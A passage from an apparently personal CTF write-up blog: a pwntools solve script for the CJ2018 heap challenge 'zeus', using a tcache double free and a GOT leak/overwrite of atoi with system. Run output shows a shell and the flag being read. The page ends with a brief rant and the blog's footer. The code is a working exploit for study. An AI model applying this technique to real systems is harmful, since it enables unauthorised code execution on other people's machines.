<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv<span style="color:#f92672">.</span>__len__() <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
    r <span style="color:#f92672">=</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span>False)
<span style="color:#66d9ef">else</span>:
    <span style="color:#75715e"># r = process(&#39;/home/vagrant/ctf/cj/p11-zeus/zeus&#39;, aslr=False, env={&#39;LD_PRELOAD&#39;:&#39;./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so&#39;})</span>
    <span style="color:#75715e"># r = process(&#39;/home/vagrant/ctf/cj/p11-zeus/zeus&#39;, aslr=False)</span>
    r <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/home/vagrant/ctf/cj/p11-zeus/zeus</span><span style="color:#e6db74">&#39;</span>)
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/lib/x86_64-linux-gnu/libc.so.6</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span>False)
    gdb<span style="color:#f92672">.</span>attach(r, gdbcmd)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insert</span>(key, val):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, len(key)<span style="color:#f92672">.</span>__str__())
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, key)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, len(val)<span style="color:#f92672">.</span>__str__())
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, val)
    r<span style="color:#f92672">.</span>recvline(False)
    log<span style="color:#f92672">.</span>info(r<span style="color:#f92672">.</span>recvline(False))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(key):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, key)
    log<span style="color:#f92672">.</span>info(r<span style="color:#f92672">.</span>recvline(False))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lookup</span>(key):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, key)
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>)
    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recvline(False)

insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
delete(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

fake_list <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x602078</span>) <span style="color:#75715e"># tcache_entries -&gt; got</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400505</span>) <span style="color:#75715e"># key : str.malloc</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x602020</span>) <span style="color:#75715e"># value : reloc.puts</span>
fake_list <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># next</span>

insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, fake_list)

puts <span style="color:#f92672">=</span> u64(lookup(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">malloc</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
log<span style="color:#f92672">.</span>info(hex(libc<span style="color:#f92672">.</span>address))

insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)

payload  <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">realloc</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># realloc</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">setvbuf</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># setvbuf</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># atoi -&gt; system</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">exit</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># exit</span>

insert(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>, payload)

r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span>)

<span style="color:#75715e"># r.sendline(&#39;cat /var/flag/*&#39;)</span>
<span style="color:#75715e"># print r.recvline(False)</span>

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">λ › python solve.py localhost <span style="color:#ae81ff">51100</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to localhost on port 51100: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ctf<span style="color:#f92672">)</span>
$ cat /var/flag/*
CJ2018<span style="color:#f92672">{</span>flag<span style="color:#f92672">}</span>
$ 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to localhost port <span style="color:#ae81ff">51100</span>
</code></pre></div><h2 id="rant">rant</h2>
<p>Soalnya cukup menarik, baru solve pas beberapa menit-menit setelah lomba selesai karena sempet kesasar dengan asumsi bisa pakai poison-null-byte (╯°. °）╯︵ ┻━┻. 11/10 would ikut again.</p>


</article>


<section class="post-nav">
    <ul>
        
        <li>
            <a href="https://kiror0.github.io/ctf/posts/noxctf-2018-grocery-list/"><i class="fa fa-chevron-circle-left"></i> noxCTF 2018 - Grocery List</a>
        </li>
        
        
        <li>
            <a href="https://kiror0.github.io/ctf/posts/fireshell-2019-leakless/">FireShell 2019 - leakless <i class="fa fa-chevron-circle-right"></i> </a>
        </li>
        
    </ul>
</section>
    





</main>
    <footer>
        <h6>Copyright © 2019 - kiror0 |
            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
            <a href="https://kiror0.github.io/ctf/index.xml">Subscribe</a></h6>
    </footer>
</div>
<script src="https://kiror0.github.io/ctf/js/scripts.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-146594173-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


</body>

</html>
